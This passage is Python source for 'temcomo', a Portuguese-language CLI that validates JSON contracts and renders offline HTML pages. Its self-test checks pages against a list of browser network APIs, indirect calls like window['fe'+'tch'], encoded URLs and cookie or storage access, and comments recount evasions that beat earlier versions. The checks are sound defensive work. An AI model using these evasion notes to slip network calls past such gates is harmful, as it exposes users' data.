#!/usr/bin/env python3
"""temcomo — motor de contratos e relatórios. Python >=3.9, stdlib pura."""
import argparse, ast, contextlib, datetime, difflib, errno, hashlib, html, inspect, io, json, math, os, re, shutil, subprocess, sys, tempfile, unicodedata, unittest
from html.parser import HTMLParser
from pathlib import Path
from unittest import mock

ENGINE_VERSION = "0.1.0"

USO = """uso: temcomo <subcomando> [argumentos]

subcomandos:
  nova-tarefa <objetivo> [--data AAAA-MM-DD]      abre a pasta da tarefa em .temcomo/tarefas/
  validar <arquivo.json>                          confere se o arquivo está no formato exigido
  renderizar <arquivo.json>                       gera a página da etapa na pasta html/
  importar-resposta <arquivo> [--tarefa <pasta>]  registra a resposta devolvida pelo navegador
  status [<tarefa>]                               mostra a etapa atual, o que falta e o próximo passo
  concluir-etapa <tarefa> <etapa>                 confere o contrato da etapa e avança a jornada
  autoteste                                       roda a bateria de testes embutida

etapas da jornada, nesta ordem:
  criada · objetivo-confirmado · pesquisa-concluida · direcao-escolhida · grill-concluido

ajuda: temcomo --ajuda"""

# Vocabulário que não pode aparecer na interface visível (usado pelo autoteste).
# A busca é por palavra inteira: "argumentos" (PT-BR) não conta como "argument".
PALAVRAS_EM_INGLES = (
    "usage", "error", "invalid", "choice", "choose", "argument", "arguments",
    "required", "unrecognized", "expected", "help", "show", "schema", "schemas",
    "gate", "gates", "fail-closed", "traceback", "file", "line", "most recent call last",
)

def sem_citacoes(texto: str) -> str:
    """Troca por reticências os trechos entre aspas simples ou duplas (o `repr` do
    Python usa aspas duplas quando o texto tem apóstrofo). Citação é dado ou
    identificador (nome de campo, operador, valor digitado), não prosa nossa — e o
    corte é por posição, não por valor: nada que o usuário digite mascara o texto fixo."""
    return re.sub(r"'[^']*'|\"[^\"]*\"", "'…'", texto)

def motivo_do_erro(erro: str) -> str:
    """Só o motivo do erro de validação, sem o caminho e sem os trechos citados."""
    _, _, motivo = erro.partition(": ")
    return sem_citacoes(motivo)

def achar_ingles(texto: str):
    """Palavras de PALAVRAS_EM_INGLES presentes no texto, como palavra inteira."""
    achados = []
    for palavra in PALAVRAS_EM_INGLES:
        padrao = re.escape(palavra)
        if palavra[0].isalnum():
            padrao = r"\b" + padrao
        if palavra[-1].isalnum():
            padrao = padrao + r"\b"
        if re.search(padrao, texto, re.IGNORECASE):
            achados.append(palavra)
    return achados

# Gabaritos das mensagens do argparse: traduzimos só o texto fixo e reinserimos
# intactos os pedaços vindos da linha de comando (nunca traduzir dado do usuário).
GABARITOS_ARGPARSE = tuple((re.compile(p, re.S), t) for p, t in (
    (r"^argument <subcomando>: invalid choice: (?P<valor>.*) \(choose from (?P<opcoes>.*)\)$",
     "subcomando inexistente: {valor} — escolha entre {opcoes}"),
    (r"^argument (?P<alvo>.*?): invalid choice: (?P<valor>.*) \(choose from (?P<opcoes>.*)\)$",
     "valor não aceito em {alvo}: {valor} — escolha entre {opcoes}"),
    (r"^the following arguments are required: (?P<alvos>.*)$",
     "faltam argumentos obrigatórios: {alvos}"),
    (r"^unrecognized arguments: (?P<extras>.*)$",
     "argumentos não reconhecidos: {extras}"),
    (r"^argument (?P<alvo>.*?): expected one argument$",
     "o argumento {alvo} precisa de um valor"),
    (r"^argument (?P<alvo>.*?): expected at most one argument$",
     "o argumento {alvo} aceita no máximo um valor"),
    (r"^argument (?P<alvo>.*?): expected (?P<n>\d+) arguments$",
     "o argumento {alvo} precisa de {n} valores"),
    (r"^argument (?P<alvo>.*?): ignored explicit argument (?P<valor>.*)$",
     "o argumento {alvo} não aceita o valor {valor}"),
    (r"^argument (?P<alvo>.*?): not allowed with argument (?P<outro>.*)$",
     "o argumento {alvo} não pode vir junto com {outro}"),
    (r"^ambiguous option: (?P<opcao>.*?) could match (?P<opcoes>.*)$",
     "opção ambígua: {opcao} — pode ser {opcoes}"),
    (r"^invalid (?P<tipo>.*?) value: (?P<valor>.*)$",
     "valor não aceito ({tipo}): {valor}"),
))

def fail(msg: str):
    print(f"ERRO: {msg}", file=sys.stderr)
    raise SystemExit(1)

def traduzir_erro_argparse(mensagem: str) -> str:
    """Casa a mensagem com um gabarito e remonta em PT-BR; dado do usuário entra intacto."""
    for padrao, modelo in GABARITOS_ARGPARSE:
        m = padrao.match(mensagem)
        if m:
            return modelo.format(**m.groupdict())
    return "chamada inválida — confira o uso abaixo"  # nunca vaza o texto em inglês

# Decisão 15 (2026-08-20): o rastro técnico do autoteste fica no formato
# original do Python — nomes de exceção, prosa da stdlib ("Lists differ", "During
# handling…") e código não são traduzidos, porque traduzi-los falsifica o
# diagnóstico. Em troca, todo rastro impresso vem precedido desta linha-rótulo.
ROTULO_RASTRO = "Detalhe técnico no formato original do Python:"

def traduzir_traceback(texto: str) -> str:
    """Traduz só o esqueleto do traceback do CPython; caminho, linha, código e
    nome da exceção seguem intactos (traduzi-los falsificaria o diagnóstico)."""
    linha_arquivo = re.compile(r'^(?P<recuo>\s*)File "(?P<arq>.*)", line (?P<lin>\d+), in (?P<onde>.*)$')
    saida = []
    for linha in texto.splitlines():
        if linha.strip() == "Traceback (most recent call last):":
            saida.append(linha.replace("Traceback (most recent call last):",
                                       "Rastro da falha (chamada mais recente por último):"))
            continue
        m = linha_arquivo.match(linha)
        saida.append(f'{m.group("recuo")}Arquivo "{m.group("arq")}", '
                     f'linha {m.group("lin")}, em {m.group("onde")}' if m else linha)
    return "\n".join(saida)

class AcaoAjuda(argparse.Action):
    """Ajuda em PT-BR: o `-h` embutido do argparse imprime texto em inglês."""

    def __init__(self, option_strings, dest=argparse.SUPPRESS, default=argparse.SUPPRESS, help=None):
        super().__init__(option_strings=option_strings, dest=dest, default=default, nargs=0)

    def __call__(self, parser, namespace, values, option_string=None):
        print(USO)
        raise SystemExit(0)

class ParserPtBr(argparse.ArgumentParser):
    """argparse com uso e erros em PT-BR (o padrão da stdlib é em inglês)."""

    def error(self, message):
        fail(f"{traduzir_erro_argparse(message)}\n\n{USO}")

def construir_parser():
    p = ParserPtBr(prog="temcomo", add_help=False)
    p.add_argument("-h", "--help", "--ajuda", action=AcaoAjuda)
    sub = p.add_subparsers(dest="cmd", required=True, metavar="<subcomando>")

    def novo(nome, func):
        sp = sub.add_parser(nome, add_help=False)
        sp.add_argument("-h", "--help", "--ajuda", action=AcaoAjuda)
        sp.set_defaults(func=func)
        return sp

    nova = novo("nova-tarefa", cmd_nova_tarefa)
    nova.add_argument("objetivo")
    nova.add_argument("--data")
    nova.add_argument("--raiz")
    nova.add_argument("--agente", default="temcomo (motor)")
    nova.add_argument("--modelo", default=NAO_DETERMINAVEL)
    nova.add_argument("--sessao", default=NAO_DETERMINAVEL)
    nova.add_argument("--transcript", default=NAO_DETERMINAVEL)

    novo("validar", cmd_validar).add_argument("contrato")
    novo("renderizar", cmd_renderizar).add_argument("contrato")
    importar = novo("importar-resposta", cmd_importar_resposta)
    importar.add_argument("arquivo")
    importar.add_argument("--tarefa")
    importar.add_argument("--raiz")

    consulta = novo("status", cmd_status)
    consulta.add_argument("tarefa", nargs="?")
    consulta.add_argument("--raiz")

    concluir = novo("concluir-etapa", cmd_concluir_etapa)
    concluir.add_argument("tarefa")
    concluir.add_argument("etapa")
    concluir.add_argument("--data")
    concluir.add_argument("--raiz")
    concluir.add_argument("--por", default="temcomo (motor)")

    novo("autoteste", cmd_autoteste).add_argument("--congelar-oraculo",
                                                 action="store_true")
    return p

# ————— checagens estáticas do artefato (spec §9; regras adaptadas dos verificadores
# da semente, que conferiam o protótipo à mão — aqui elas valem para toda página gerada) —————

# Atributos que o HTML usa para BUSCAR alguma coisa. Conjunto fechado da especificação —
# lista de mecanismos, não de venenos: quem inventar uma URL nova vai ter de usar um deles.
ATRIBUTOS_QUE_BUSCAM = ("src", "srcset", "href", "action", "formaction", "poster", "data",
                        "background", "cite", "manifest", "longdesc", "ping", "xlink:href")

# APIs do navegador que falam com a rede. Aqui a lista é inevitável — são nomes próprios —,
# então o gate NÃO se apoia só nela: o acesso indireto a globais também é barrado, que é
# como `window["fe"+"tch"]` escapava.
APIS_DE_REDE = ("fetch", "XMLHttpRequest", "WebSocket", "importScripts", "sendBeacon",
                "EventSource", "Worker", "SharedWorker", "navigator.connection")

def problemas_de_rede(pagina: str, origem: str) -> list:
    """A página tem de abrir num notebook sem internet, hoje e em dez anos.

    Uma única referência externa quebra isso em silêncio: a fonte não carrega, o logo
    some, e quem abriu o arquivo não sabe por quê.

    A r1 deste gate era uma lista de literais e as cinco evasões do mandato passaram —
    `srcset`, `url()` no CSS, `import()`, `meta refresh` e aspas simples. Agora a régua é
    o MECANISMO: todo atributo que busca alguma coisa, toda URL absoluta em qualquer
    posição, e todo caminho de execução indireta."""
    problemas = []

    def acusar(detalhe, tecnico=None):
        recado = (f"{origem}: a página tenta buscar ou enviar coisa fora do próprio "
                  f"arquivo — ela precisa funcionar sem internet, com tudo embutido. "
                  f"{detalhe}")
        if tecnico:
            recado += f"\n{ROTULO_RASTRO} {tecnico}"
        problemas.append(recado)

    # 1) atributos que buscam, com qualquer aspas, apontando para fora.
    # O navegador DECODIFICA entidades HTML no valor de um atributo antes de buscar, então
    # `src="&#104;&#116;&#116;&#112;&#115;://…"` vira `src="https://…"` e busca de verdade.
    # Ler o HTML cru deixaria a URL escondida — por isso o `html.unescape` aqui. (Não vale
    # para o CSS abaixo: o parser de CSS não decodifica entidades, então lá elas são inertes.)
    atributos = "|".join(re.escape(a) for a in ATRIBUTOS_QUE_BUSCAM)
    for atributo, bruto in re.findall(rf"""\b({atributos})\s*=\s*["']([^"']*)["']""", pagina):
        valor = html.unescape(bruto)
        for endereco in re.split(r"[,\s]+", valor):
            if re.match(r"^(?:[a-zA-Z][a-zA-Z0-9+.-]*:)?\/\/", endereco):
                acusar(f"O endereço citado é {_resumo(endereco, 60)}.",
                       f"atributo {atributo}")

    # 2) qualquer URL absoluta em QUALQUER CSS: dentro de <style>, num atributo `style`
    # e nas duas formas do @import (com e sem `url()`). A r2 olhava só `url()` dentro de
    # <style>, então `@import "https://…"` — que é CSS igualmente válido — passava.
    css = re.findall(r"<style\b[^>]*>(.*?)</style>", pagina, re.S)
    css += re.findall(r"""\bstyle\s*=\s*["']([^"']*)["']""", pagina)
    for bloco in css:
        enderecos = re.findall(r"url\(\s*['\"]?([^)'\"]+)", bloco)
        enderecos += re.findall(r"""@import\s+(?:url\()?\s*['"]?([^;'")\s]+)""", bloco)
        for endereco in enderecos:
            if re.match(r"^(?:[a-zA-Z][a-zA-Z0-9+.-]*:)?\/\/", endereco):
                acusar(f"O endereço citado é {_resumo(endereco, 60)}.",
                       "endereço externo no CSS")

    # 3) redirecionamento por meta refresh
    for conteudo in re.findall(r"""<meta\b[^>]*http-equiv\s*=\s*["']refresh["'][^>]*>""",
                               pagina, re.I):
        acusar("A página manda o navegador ir para outro endereço sozinha.",
               _resumo(conteudo, 80))

    # 4) APIs de rede e execução indireta, dentro dos scripts
    for script in re.findall(r"<script\b[^>]*>(.*?)</script>", pagina, re.S):
        for api in APIS_DE_REDE:
            if re.search(rf"\b{re.escape(api)}\b", script):
                acusar("O programa da página chama uma função que fala com a rede.", api)
        if re.search(r"\bimport\s*\(", script):
            acusar("O programa da página carrega código de fora em tempo de execução.",
                   "import() dinâmico")
        # `window["fe"+"tch"]` monta o nome em pedaços: nenhuma lista de nomes pega isso,
        # mas o caminho para chegar lá é sempre o mesmo — indexar um objeto global.
        for indireto in re.findall(r"\b(window|globalThis|self|document)\s*\[", script):
            acusar("O programa da página alcança funções do navegador por um caminho "
                   "indireto, que serve para esconder o que está sendo chamado.",
                   f"{indireto}[...]")
        # `"https:" + "//host/"` monta o endereço em pedaços, e nenhum deles é uma URL
        # inteira. O que não dá para esconder é a MATÉRIA-PRIMA: um esquema solto ou um
        # `//host` num literal de texto não têm outro uso numa página offline.
        for literal in re.findall(r"""["']([^"'\n]{2,200})["']""", script):
            if re.match(r"^[a-zA-Z][a-zA-Z0-9+.-]*:$", literal) and literal != "data:":
                acusar("O programa da página monta um endereço de internet em pedaços.",
                       f"trecho de endereço: {_resumo(literal, 40)}")
            elif "://" in literal or re.match(r"^\/\/[^\/\s]+\.[^\/\s]", literal):
                acusar("O programa da página carrega um endereço de internet.",
                       f"trecho de endereço: {_resumo(literal, 60)}")
    return problemas

def _sem_comentarios_js(script: str) -> str:
    """O script sem comentários — comentário não executa nada.

    O gate de armazenamento é rígido de propósito: qualquer menção fora da forma
    canônica reprova. Sem esta limpeza, a própria prosa que explica o rascunho ('o
    localStorage guarda o estado sem perdas') viraria acusação, e o jeito de calar o
    gate seria apagar a explicação — o pior dos dois mundos."""
    saida, i, n = [], 0, len(script)
    while i < n:
        c = script[i]
        if c in "\"'`":                                   # string: copia inteira
            aspas, i = c, i + 1
            saida.append(aspas)
            while i < n and script[i] != aspas:
                if script[i] == "\\" and i + 1 < n:
                    saida.append(script[i:i + 2])
                    i += 2
                    continue
                saida.append(script[i])
                i += 1
            saida.append(aspas)
            i += 1
        elif script.startswith("//", i):
            i = script.find("\n", i)
            if i == -1:
                break
        elif script.startswith("/*", i):
            fim = script.find("*/", i + 2)
            i = n if fim == -1 else fim + 2
        else:
            saida.append(c)
            i += 1
    return "".join(saida)

def problemas_de_armazenamento(pagina: str, origem: str) -> list:
    """O rascunho mora no navegador de quem decide, junto com o de todo mundo. Sem o
    namespace, duas tarefas diferentes disputam a mesma chave e uma apaga a outra."""
    problemas = []
    embutido = _contrato_embutido(pagina)
    if embutido is None:
        return [f"{origem}: sem o contrato embutido não dá para conferir a chave do rascunho"]
    chave = (embutido.get("export") or {}).get("chave_localstorage")
    if not isinstance(chave, str) or not chave.startswith("temcomo:"):
        problemas.append(f"{origem}: a chave do rascunho {_resumo(chave, 60)} não começa com "
                         f"'temcomo:' — sem o namespace ela colide com outras páginas no "
                         f"mesmo navegador")
    # E o script tem de usar ESSA chave. A r1 procurava `localStorage.setItem("literal"`
    # com aspas duplas — `sessionStorage`, aspas simples e acesso por colchetes passavam.
    # A régua agora é o mecanismo: qualquer toque em armazenamento que não seja
    # `localStorage.<verbo>(STORAGE_KEY…)` é acusado.
    # A regra é lista PERMITIDA, não caça a formas conhecidas: existe uma única maneira
    # de a página tocar em armazenamento — `localStorage.<verbo>(STORAGE_KEY…)`. Qualquer
    # outra menção reprova, com apelido ou sem. A r2 procurava quatro grafias e deixava
    # passar `const ls = localStorage`, `indexedDB`, cookie e `clear()`.
    FORMA_PERMITIDA = re.compile(r"\.\s*(?:setItem|getItem|removeItem)\s*\(\s*STORAGE_KEY\b")
    for bruto in re.findall(r"<script\b[^>]*>(.*?)</script>", pagina, re.S):
        script = _sem_comentarios_js(bruto)
        for gaveta in ("sessionStorage", "indexedDB", "openDatabase", "caches",
                       "localforage", "webkitStorageInfo"):
            if re.search(rf"\b{gaveta}\b", script):
                problemas.append(f"{origem}: a página usa outra gaveta do navegador além "
                                 f"da combinada, e o que você escreve pode acabar em dois "
                                 f"lugares diferentes.\n{ROTULO_RASTRO} {gaveta}")
        if re.search(r"\bdocument\s*\.\s*cookie\b", script):
            problemas.append(f"{origem}: a página guarda coisa em cookie, que viaja para "
                             f"fora do navegador em cada visita — o rascunho fica só aqui."
                             f"\n{ROTULO_RASTRO} document.cookie")
        for uso in re.finditer(r"\blocalStorage\b", script):
            if FORMA_PERMITIDA.match(script[uso.end():uso.end() + 80].lstrip()):
                continue                     # a única forma combinada
            trecho = script[uso.start():uso.end() + 40].replace("\n", " ")
            problemas.append(f"{origem}: a página toca no armazenamento fora da única "
                             f"forma combinada — guardar o rascunho na chave da tarefa. "
                             f"Assim não dá para saber com que chave ela escreve, e duas "
                             f"tarefas podem apagar uma a outra."
                             f"\n{ROTULO_RASTRO} {_resumo(trecho, 60)}")
    return problemas

def _contrato_embutido(pagina: str):
    """O documento que o JavaScript da página vai ler, ou None se não der para lê-lo."""
    abertura = '<script type="application/json" id="contrato-json">'
    if abertura not in pagina:
        return None
    inicio = pagina.index(abertura) + len(abertura)
    try:
        return json.loads(pagina[inicio:pagina.index("</script>", inicio)].replace("<\\/", "</"))
    except ValueError:
        return None

def problemas_do_contrato_embutido(pagina: str, contrato: dict, origem: str) -> list:
    """O que o JavaScript lê tem de ser o mesmo contrato que virou HTML.

    Se os dois divergirem, a página mostra uma coisa e exporta outra — e o usuário assina
    o que não viu."""
    embutido = _contrato_embutido(pagina)
    if embutido is None:
        return [f"{origem}: a página não embute, de forma legível, o contrato que a originou"]
    esperado = json.loads(json.dumps(contrato))
    esperado["export"] = embutido.get("export")     # derivado pelo motor, não vem da entrada
    if embutido != esperado:
        divergentes = sorted(set(embutido) ^ set(esperado)) or [
            campo for campo in esperado if embutido.get(campo) != esperado.get(campo)]
        return [f"{origem}: o contrato embutido na página não é o contrato de entrada — "
                f"divergem em {_lista_resumida(divergentes)}"]
    return []

def problemas_de_jargao(pagina: str, origem: str) -> list:
    """O título é para quem decide, não para quem programa. 'grill', 'schema' e 'JSON'
    são vocabulário nosso — na página eles só assustam."""
    titulos = re.findall(r"<h1[^>]*>(.*?)</h1>", pagina, re.S)
    problemas = []
    for titulo in titulos:
        limpo = re.sub(r"<[^>]+>", "", titulo)
        for jargao in ("grill", "schema", "json", "payload", "endpoint"):
            if jargao in limpo.lower():
                problemas.append(f"{origem}: o título da página usa jargão interno "
                                 f"('{jargao}') — quem lê não é da área")
    return problemas

def paginas_para_checagem() -> list:
    """(nome, contrato, página) de cada exemplo válido que vira página."""
    saida = []
    for arquivo, render in (("direcoes.json", render_direcoes),
                            ("grill-rodada.json", render_grill)):
        caminho = PASTA_DE_EXEMPLOS / "validos" / arquivo
        contrato = json.loads(caminho.read_text(encoding="utf-8"))
        saida.append((arquivo, contrato, render(contrato)))
    return saida

def checagens_estaticas() -> list:
    """Todas as regras estáticas sobre todas as páginas que o motor sabe gerar."""
    problemas = []
    for nome, contrato, pagina in paginas_para_checagem():
        problemas += problemas_de_rede(pagina, nome)
        problemas += problemas_de_armazenamento(pagina, nome)
        problemas += problemas_do_contrato_embutido(pagina, contrato, nome)
        problemas += problemas_de_jargao(pagina, nome)
    return problemas

# ————— prova fail-closed: a validação tem de REPROVAR (spec §9) —————

def _erros_do_documento(dado: dict, versao: str) -> list:
    return validar_contra_schema(dado, carregar_schema(versao)) + regras_extras(dado)

def _sem_o_campo(dado, caminho):
    """Cópia do documento sem o campo apontado — o caminho anda por chaves e índices."""
    copia = json.loads(json.dumps(dado))
    alvo = copia
    for passo in caminho[:-1]:
        alvo = alvo[passo]
    del alvo[caminho[-1]]
    return copia

def _campos_obrigatorios(dado, schema, caminho=()):
    """Todo `required` que a definição impõe, percorrendo o documento junto com ela."""
    if not isinstance(schema, dict) or not isinstance(dado, (dict, list)):
        return
    if isinstance(dado, dict):
        for campo in schema.get("required") or []:
            if campo in dado:
                yield caminho + (campo,)
        for campo, sub in (schema.get("properties") or {}).items():
            if campo in dado:
                yield from _campos_obrigatorios(dado[campo], sub, caminho + (campo,))
    elif isinstance(dado, list) and schema.get("items"):
        for i, item in enumerate(dado):
            yield from _campos_obrigatorios(item, schema["items"], caminho + (i,))

def provas_de_campo_obrigatorio() -> list:
    """(exemplo, campo, erros) para cada campo obrigatório removido de cada exemplo."""
    provas = []
    for caminho in sorted((PASTA_DE_EXEMPLOS / "validos").glob("*.json")):
        dado = json.loads(caminho.read_text(encoding="utf-8"))
        versao = dado.get("schema_version")
        if versao not in SCHEMAS:
            continue
        schema = carregar_schema(versao)
        for campo in _campos_obrigatorios(dado, schema):
            trilha = ".".join(str(p) for p in campo)
            provas.append((caminho.name, trilha,
                           _erros_do_documento(_sem_o_campo(dado, campo), versao)))
    return provas

def provas_de_fora_da_caixa() -> list:
    """(exemplo, erros) marcando uma segunda opção como fora da caixa — o limite é 1."""
    provas = []
    direcoes = json.loads((PASTA_DE_EXEMPLOS / "validos" / "direcoes.json")
                          .read_text(encoding="utf-8"))
    for item in direcoes["direcoes"]:
        item["fora_da_caixa"] = True
    provas.append(("direcoes.json", _erros_do_documento(direcoes, "direcoes-v1")))

    grill = json.loads((PASTA_DE_EXEMPLOS / "validos" / "grill-rodada.json")
                       .read_text(encoding="utf-8"))
    for pergunta in grill["perguntas"]:
        for opcao in pergunta["opcoes"]:
            opcao["fora_da_caixa"] = True
    provas.append(("grill-rodada.json", _erros_do_documento(grill, "grill-rodada-v1")))
    return provas

# ————— oráculo: a prova precisa saber o tamanho que deveria ter (spec §9) —————
#
# Os goldens continuam sendo `contracts/exemplos/` — fonte única, sem cópia. Mas uma prova
# que lê exemplo e schema da MESMA revisão só demonstra que os dois concordam entre si:
# enfraquecer um `required` reduzia as provas em silêncio e a suíte seguia verde. O
# manifesto abaixo é o ponto fixo independente — mudou o golden ou o schema, o autoteste
# acusa e exige atualização consciente.
def caminho_do_minidom() -> Path:
    """O DOM de mentira que o autoteste usa para exercitar a página de verdade."""
    return PASTA_DO_MOTOR / "autoteste_dados" / "minidom.js"

def caminho_do_oraculo() -> Path:
    # função, e não constante: este bloco é lido antes de `PASTA_DO_MOTOR` existir
    return PASTA_DO_MOTOR / "autoteste_dados" / "oraculo.json"

def _sha_do_arquivo(caminho: Path) -> str:
    return hashlib.sha256(caminho.read_bytes()).hexdigest()

def calcular_oraculo() -> dict:
    """O estado que o autoteste espera encontrar no disco, derivado dele."""
    por_contrato = {}
    for exemplo, _, _ in provas_de_campo_obrigatorio():
        por_contrato[exemplo] = por_contrato.get(exemplo, 0) + 1
    return {
        "schemas": {versao: _sha_do_arquivo(caminho)
                    for versao, caminho in sorted(SCHEMAS.items()) if caminho.exists()},
        "exemplos_validos": {c.name: _sha_do_arquivo(c) for c in
                             sorted((PASTA_DE_EXEMPLOS / "validos").glob("*.json"))},
        "exemplos_invalidos": {c.name: _sha_do_arquivo(c) for c in
                               sorted((PASTA_DE_EXEMPLOS / "invalidos").glob("*.json"))},
        # recusados só na importação: bem formados, mas em desacordo com o contrato de
        # origem (decisão 20). Ficam fora de `invalidos/` porque lá a regra é o validador
        # recusar — e estes, corretamente, passam por ele.
        "recusados_na_importacao": {
            c.name: _sha_do_arquivo(c) for c in
            sorted((PASTA_DE_EXEMPLOS / "recusados-na-importacao").glob("*.json"))},
        "provas_por_exemplo": dict(sorted(por_contrato.items())),
        "total_de_provas": (len(provas_de_campo_obrigatorio())
                            + len(provas_de_fora_da_caixa())),
    }

def carregar_oraculo() -> dict:
    alvo = caminho_do_oraculo()
    if not alvo.exists():
        fail(f"falta um arquivo do próprio motor: '{citar(alvo)}' — sem ele o autoteste "
             f"não sabe o tamanho que a prova deveria ter")
    return ler_json(alvo)

def gravar_oraculo() -> Path:
    """Congela o estado atual. Ato consciente: rode quando a mudança for intencional."""
    alvo = caminho_do_oraculo()
    alvo.parent.mkdir(parents=True, exist_ok=True)
    texto = json.dumps(calcular_oraculo(), ensure_ascii=False, indent=2) + "\n"
    temporario = None
    try:      # mesma publicação atômica do registro da tarefa
        descritor, bruto = tempfile.mkstemp(prefix=".oraculo-", suffix=".json",
                                            dir=str(alvo.parent))
        os.close(descritor)
        temporario = Path(bruto)
        temporario.write_text(texto, encoding="utf-8")
        os.replace(str(temporario), str(alvo))
        temporario = None
    except OSError as e:
        fail(f"não consegui gravar o oráculo em '{citar(alvo)}' — {motivo_do_sistema(e)}")
    finally:
        if temporario is not None:
            temporario.unlink(missing_ok=True) if hasattr(Path, "unlink") else None
    return alvo

def problemas_do_oraculo() -> list:
    """Onde o disco divergiu do que a prova assume. Vazio = os goldens são os de sempre."""
    esperado, encontrado = carregar_oraculo(), calcular_oraculo()
    problemas = []
    for secao in ("schemas", "exemplos_validos", "exemplos_invalidos",
                  "recusados_na_importacao"):
        antes, agora = esperado.get(secao, {}), encontrado.get(secao, {})
        for nome in sorted(set(antes) | set(agora)):
            if nome not in antes:
                problemas.append(f"'{nome}' apareceu em {secao} depois que o oráculo foi "
                                 f"congelado — se a inclusão é intencional, atualize o "
                                 f"oráculo; se não, o arquivo não deveria estar aí")
            elif nome not in agora:
                problemas.append(f"'{nome}' sumiu de {secao} — a prova contava com ele")
            elif antes[nome] != agora[nome]:
                problemas.append(f"'{nome}' mudou desde que o oráculo foi congelado — "
                                 f"mexer no golden muda o que a prova prova, então a "
                                 f"atualização precisa ser deliberada")
    for exemplo in sorted(set(esperado.get("provas_por_exemplo", {}))
                          | set(encontrado.get("provas_por_exemplo", {}))):
        antes = esperado.get("provas_por_exemplo", {}).get(exemplo)
        agora = encontrado.get("provas_por_exemplo", {}).get(exemplo)
        if antes != agora:
            problemas.append(f"'{exemplo}' rende {agora} provas de campo obrigatório, e o "
                             f"oráculo esperava {antes} — schema ou exemplo mudou de forma "
                             f"que enfraquece ou amplia a prova")
    if esperado.get("total_de_provas") != encontrado.get("total_de_provas"):
        problemas.append(f"a bateria fail-closed rende {encontrado.get('total_de_provas')} "
                         f"provas, e o oráculo esperava {esperado.get('total_de_provas')}")
    if problemas:
        problemas.append(f"para congelar o estado atual de propósito, rode: "
                         f"temcomo autoteste --congelar-oraculo")
    return problemas

def provas_fail_closed() -> list:
    """Onde a validação deixou passar o que deveria recusar. Vazio = motor fechado."""
    problemas = list(problemas_do_oraculo())
    for exemplo, campo, erros in provas_de_campo_obrigatorio():
        if not erros:
            problemas.append(f"'{exemplo}' foi aceito sem o campo obrigatório '{campo}' — "
                             f"a definição exige o campo e a validação não cobrou")
    for exemplo, erros in provas_de_fora_da_caixa():
        if not erros:
            problemas.append(f"'{exemplo}' foi aceito com mais de uma opção fora da caixa — "
                             f"o limite de 1 é regra da spec, não sugestão")
    return problemas

def diagnostico_da_suite(res):
    """(codigo, resumo, problemas) a partir de um resultado do unittest.
    O veredito é o do próprio unittest (`wasSuccessful`) — inclui sucesso
    inesperado (`@expectedFailure` que passou), que não entra em failures/errors."""
    problemas = [(t, f"{ROTULO_RASTRO}\n{traduzir_traceback(d)}")
                 for t, d in list(res.failures) + list(res.errors)]
    problemas += [(t, "teste marcado como falha esperada, mas passou — reveja a marcação")
                  for t in getattr(res, "unexpectedSuccesses", [])]
    if res.wasSuccessful() and not problemas:
        return 0, f"AUTOTESTE OK — {res.testsRun} testes", problemas
    return 1, f"AUTOTESTE FALHOU — {max(len(problemas), 1)} de {res.testsRun} testes com problema", problemas

def cmd_autoteste(args):
    """A suíte inteira e mais os gates que ela não alcança sozinha.

    A suíte responde 'o que eu escrevi passa?'. Os gates respondem duas perguntas que
    nenhum teste verde responde: a página gerada continua abrindo offline e sem colidir
    com outras, e a validação ainda RECUSA o que tem de recusar. Qualquer um dos três
    reprova, o comando reprova (spec §9)."""
    if getattr(args, "congelar_oraculo", False):
        alvo = gravar_oraculo()
        print(f"Oráculo do autoteste congelado em '{citar(alvo)}'.")
        print("Confira a mudança antes de commitar: ela redefine o que a prova prova.")
        raise SystemExit(0)
    suite = unittest.defaultTestLoader.loadTestsFromModule(sys.modules[__name__])
    descartado = io.StringIO()  # a saída do runner é em inglês; usamos resumo próprio
    res = unittest.TextTestRunner(stream=descartado, verbosity=0).run(suite)
    codigo, resumo, problemas = diagnostico_da_suite(res)
    if codigo:
        for teste, detalhe in problemas:
            print(f"\n— falhou: {teste.id()}\n{detalhe}", file=sys.stderr)

    # A lista nasce aqui dentro de propósito: montada no topo do módulo, ela congelaria a
    # referência das funções, e trocar um gate (num teste ou num fork) não teria efeito.
    gates = (("conferência das páginas geradas", checagens_estaticas),
             ("prova de que a validação recusa", provas_fail_closed))
    achados = []
    for nome, gate in gates:
        try:
            achados += [(nome, item) for item in gate()]
        except OSError as e:                      # gate quebrado não vira gate ausente
            achados.append((nome, f"o gate não chegou ao fim — {motivo_do_sistema(e)}"))
        except Exception as e:
            achados.append((nome, f"o gate não chegou ao fim, então o comando reprova por "
                                  f"precaução.\n{ROTULO_RASTRO} {type(e).__name__}: {e}"))
    for nome, item in achados:
        print(f"\n— {citar(nome)}: {item}", file=sys.stderr)

    if achados:
        quantos = len(achados)
        plural = "" if quantos == 1 else "s"
        resumo = (f"AUTOTESTE FALHOU — {quantos} problema{plural} fora da suíte"
                  if codigo == 0 else f"{resumo} e mais {quantos} fora da suíte")
        codigo = 1
    print(resumo, file=sys.stderr if codigo else sys.stdout)
    raise SystemExit(codigo)

# ————— validador de contratos (subset de JSON Schema, sem dependência externa) —————

TIPOS_JSON = {
    "object": dict, "array": list, "string": str, "number": (int, float),
    "integer": int, "boolean": bool, "null": type(None),
}

NOME_PT_DO_TIPO = {
    "object": "objeto", "array": "lista", "string": "texto", "number": "número",
    "integer": "inteiro", "boolean": "booleano", "null": "nulo",
}

NOMES_DE_TIPO = (
    (bool, "booleano"), (int, "inteiro"), (float, "número"), (str, "texto"),
    (list, "lista"), (dict, "objeto"), (type(None), "nulo"),
)

def _finito(valor) -> bool:
    """Inteiro é sempre finito — e `math.isfinite` estoura com inteiro gigante
    (`10**399`), então a checagem de finitude só faz sentido sobre `float`."""
    return not (isinstance(valor, float) and not math.isfinite(valor))

def nome_do_tipo(valor) -> str:
    """Nome do tipo em PT-BR, para a mensagem de erro."""
    if not _finito(valor):
        return "valor não-finito (infinito ou indefinido)"
    for classe, nome in NOMES_DE_TIPO:
        if isinstance(valor, classe):
            return nome
    return type(valor).__name__

# Forma que cada operador precisa ter na definição do formato: (tipos aceitos,
# descrição em PT-BR). Operador fora da forma = definição quebrada = reprova.
FORMA_DOS_OPERADORES = {
    "type": ((str, list), "texto ou lista de textos"),
    "required": ((list,), "lista de nomes de campo"),
    "properties": ((dict,), "objeto"),
    "items": ((dict,), "objeto"),
    "enum": ((list,), "lista de valores"),
    "additionalProperties": ((bool,), "verdadeiro ou falso"),
    "minLength": ((int,), "número inteiro"),
    "maxLength": ((int,), "número inteiro"),
    "minItems": ((int,), "número inteiro"),
    "maxItems": ((int,), "número inteiro"),
    "minimum": ((int, float), "número"),
